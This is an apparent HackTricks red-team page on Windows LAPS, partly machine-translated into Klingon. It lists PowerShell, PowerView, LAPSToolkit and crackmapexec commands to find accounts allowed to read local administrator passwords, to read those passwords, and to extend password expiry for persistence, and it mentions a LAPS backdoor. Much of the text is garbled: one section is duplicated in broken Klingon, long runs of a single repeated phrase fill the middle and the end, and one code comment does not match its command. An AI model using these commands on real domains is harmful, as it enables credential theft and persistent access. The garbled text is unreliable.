# LAPS

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhIngan Hol</strong></a><strong>!</strong></summary>

* **Do you work in a cybersecurity company**? **Do you want to see your company advertised in HackTricks**? **or do you want to have access to the latest version of the PEASS or download HackTricks in PDF**? **Check the SUBSCRIPTION PLANS**!
* **Discover The PEASS Family**, **our collection of exclusive NFTs**
* **Get the official PEASS & HackTricks swag**
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) **Discord group** or the **telegram group** or **follow** me on **Twitter** 🐦**@carlospolopm**.
* **Share your hacking tricks by submitting PRs to the hacktricks repo and hacktricks-cloud repo**.

</details>

## Basic Information

Local Administrator Password Solution (LAPS) is a tool used for managing a system where **administrator passwords**, which are **unique, randomized, and frequently changed**, are applied to domain-joined computers. These passwords are stored securely within Active Directory and are only accessible to users who have been granted permission through Access Control Lists (ACLs). The security of the password transmissions from the client to the server is ensured by the use of **Kerberos version 5** and **Advanced Encryption Standard (AES)**.

In the domain's computer objects, the implementation of LAPS results in the addition of two new attributes: **`ms-mcs-AdmPwd`** and **`ms-mcs-AdmPwdExpirationTime`**. These attributes store the **plain-text administrator password** and **its expiration time**, respectively.

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

You could **download the raw LAPS policy** from `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` and then use **`Parse-PolFile`** from the [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

Moreover, the **native LAPS PowerShell cmdlets** can be used if they're installed on a machine we have access to:

### LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` **raw LAPS policy** **download** **can be**. **`Parse-PolFile`** **GPRegistryPolicyParser** **package** **`human-readable`** **format** **convert** **can be**.

**Native LAPS PowerShell cmdlets** **can be used** **if** **installed** **on a machine** **we have access to**.
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** jatlh **ghaH 'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilitates the enumeration of LAPS this with several functions.\
One is parsing **`ExtendedRights`** for **all computers with LAPS enabled.** This will show **groups** specifically **delegated to read LAPS passwords**, which are often users in protected groups.\
An **account** that has **joined a computer** to a domain receives `All Extended Rights` over that host, and this right gives the **account** the ability to **read passwords**. Enumeration may show a user account that can read the LAPS password on a host. This can help us **target specific AD users** who can read LAPS passwords.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **LAPS Passwords jImej With Crackmapexec**
vaj 'oH powershell 'e' vItlhutlh. LDAP Daq vItlhutlh 'e' vItlhutlh.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
**LAPS Persistence**

### **Expiration Date**

**Qa'vIn** admin, **password**-lI' **ghItlh** **'ej** **machine** **password** **'e'** **'ej** **expiration date** **vItlhutlh** **'e'** **ghItlh**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Qa'vIn **admin** **`Reset-AdmPwdPassword`** cmdlet lo'laHbe'; be'nal **Do not allow password expiration time longer than required by policy** LAPS GPO enabled bo'lu'chugh.
{% endhint %}

### Backdoor

LAPS jatlhpu'wI' ghItlhpu' [ghaH](https://github.com/GreyCorbel/admpwd) 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e
